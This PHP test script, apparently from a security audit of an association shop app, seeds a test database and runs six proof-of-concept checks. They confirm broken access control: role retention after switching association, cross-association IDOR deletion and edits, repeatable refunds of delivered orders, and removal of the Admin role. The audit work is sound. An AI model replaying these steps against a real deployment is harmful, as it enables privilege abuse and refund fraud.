<?php
require __DIR__ . '/lib.php';
session_start();
$pdo = baseDeTest(); $_SESSION['nomAsso'] = 'X';
include_once RACINE . '/token.php';
include_once RACINE . '/vue_generique.php';

// Jeu de données : asso 1 (celle de l'attaquant) et asso 2 (la cible)
$pdo->exec("INSERT INTO association(nom,image,statut) VALUES ('A','x','valide'),('B','x','valide')");
$pdo->exec("INSERT INTO utilisateurs(id,login) VALUES (10,'gestionnaireA'),(20,'clientB')");
$pdo->exec("INSERT INTO role VALUES (10,1,'Gestionnaire')");
$pdo->exec("INSERT INTO fournisseur(id,nom,idAssociation) VALUES (100,'fournisseur de B',2)");

// ---- CA-1 : changer d'association sans changer de rôle (cont_asso.php:77-145)
include_once RACINE . '/modules/mod_asso/cont_asso.php';
$_SESSION = ['login'=>'gestionnaireA','id'=>10,'role'=>'Gestionnaire','asso'=>1];
$_GET = ['id'=>'2'];                        // le gestionnaire de A « choisit » l'asso B, où il n'a aucun rôle
silence(fn() => (new ContAsso())->aAppuyeAsso());
verdict('CA-1', "rôle Gestionnaire conservé après changement vers l'asso B (asso=".$_SESSION['asso'].')',
        $_SESSION['role'] === 'Gestionnaire' && $_SESSION['asso'] == 2);

// ---- CA-2 : IDOR suppression de fournisseur d'une autre asso (modele_fournisseur.php:10-13)
include_once RACINE . '/modules/mod_fournisseur/cont_fournisseur.php';
$_SESSION = ['login'=>'gestionnaireA','id'=>10,'role'=>'Gestionnaire','asso'=>1];
$_GET = ['id'=>'100'];                      // fournisseur 100 appartient à l'asso 2
silence(fn() => (new ContFournisseur())->supprimerFournisseur());
$reste = (int)$pdo->query("SELECT COUNT(*) FROM fournisseur WHERE id=100")->fetchColumn();
verdict('CA-2', "fournisseur de l'asso B supprimé par le gestionnaire de A", $reste === 0);

// ---- CA-3 : IDOR modification de produit d'une autre asso (modele_produit.php:64-70)
$pdo->exec("INSERT INTO produit(id,nom,prix,image) VALUES (500,'produit de B',2,'vide')");
require_once RACINE . '/modules/mod_produit/modele_produit.php';
(new ModeleProduit())->updateProduit(500, 'modifié par A', 0);   // c'est l'appel exact de cont_produit.php:97
$nom = $pdo->query("SELECT nom FROM produit WHERE id=500")->fetchColumn();
verdict('CA-3', "updateProduit() sans filtre d'association (le contrôleur ne vérifie pas l'appartenance)", $nom === 'modifié par A',
        'cont_produit.php:93,97 : $idProduit vient de $_GET[id], aucune jointure boutique/association');

// ---- CA-4 : remboursement répétable d'une commande (cont_commande.php:92-111)
include_once RACINE . '/modules/mod_commande/cont_commande.php';
$pdo->exec("INSERT INTO inventaire(id,idAssociation) VALUES (1,1)");
$pdo->exec("INSERT INTO ligneInventaire VALUES (1,500,0,0,0)");
$pdo->exec("INSERT INTO utilisateurs(id,login) VALUES (30,'barmanA')");
$pdo->exec("INSERT INTO role VALUES (30,1,'Barman')");
$pdo->exec("INSERT INTO solde VALUES (20,1,0)");
$pdo->exec("INSERT INTO commande VALUES (1,20,'2026-01-01 10:00:00','livrée',1,'abc',30)");   // déjà livrée
$pdo->exec("INSERT INTO ligneCommande VALUES (1,500,3,'2026-01-01 10:00:00')");                // 3 x prix 0 modifié en CA-3
$pdo->exec("UPDATE produit SET prix=5 WHERE id=500");
$solde = function() use ($pdo) { return (float)$pdo->query("SELECT solde FROM solde WHERE idUtilisateur=20")->fetchColumn(); };
// appels directs au modèle pour éviter exit() : c'est exactement la séquence de cont_commande.php:99-103
$m = new ModeleCommande();
for ($i = 0; $i < 3; $i++) {
    $_SESSION = ['login'=>'barmanA','id'=>30,'role'=>'Barman','asso'=>1];
    $m->rembourser($m->getClient(1,'2026-01-01 10:00:00'), $m->prixTotal(1,'2026-01-01 10:00:00'));
    $m->refuser(1,'2026-01-01 10:00:00');
}
verdict('CA-4', "commande déjà « livrée » remboursée 3 fois : solde = ".$solde().' € pour 15 € d\'achat', $solde() > 15,
        "cont_commande.php:92-111 ne teste jamais le statut ; séquence rejouée via le modèle");
// ---- CA-5 : accepterDemande() réécrit TOUS les rôles de l'utilisateur ciblé (modele_admin.php:62-65)
include_once RACINE . '/modules/mod_admin/modele_admin.php';
$pdo->exec("INSERT INTO utilisateurs(id,login) VALUES (40,'autreGestionnaire')");
$pdo->exec("INSERT INTO role VALUES (40,1,'Gestionnaire')");
(new ModeleAdmin())->accepterDemandeUtilisateur(40, 1);      // appel exact de cont_admin.php:93-96 avec ?id=40
$r = $pdo->query("SELECT role FROM role WHERE idUtilisateur=40")->fetchColumn();
verdict('CA-5', "accepterDemande sur un Gestionnaire : son rôle devient « $r » (aucun filtre role='enCours')", $r === 'Client');
// ---- CA-6 : un gestionnaire peut retirer le rôle Admin (rattaché à l'asso 1 dans le dump fourni)
$pdo->exec("INSERT INTO utilisateurs(id,login) VALUES (1,'admin')");
$pdo->exec("INSERT INTO role VALUES (1,1,'Admin')");
(new ModeleAdmin())->deleteUtilisateur(1, 1);        // appel exact de cont_admin.php:71 avec ?id=1 et asso=1 ; aucun contrôle du rôle de la cible
$admin = (int)$pdo->query("SELECT COUNT(*) FROM role WHERE role='Admin'")->fetchColumn();
verdict('CA-6', 'bannirUtilisateur sur l\'Admin : son rôle est supprimé (cont_admin.php:66-76 ne teste pas le rôle de la cible)', $admin === 0);
fin();
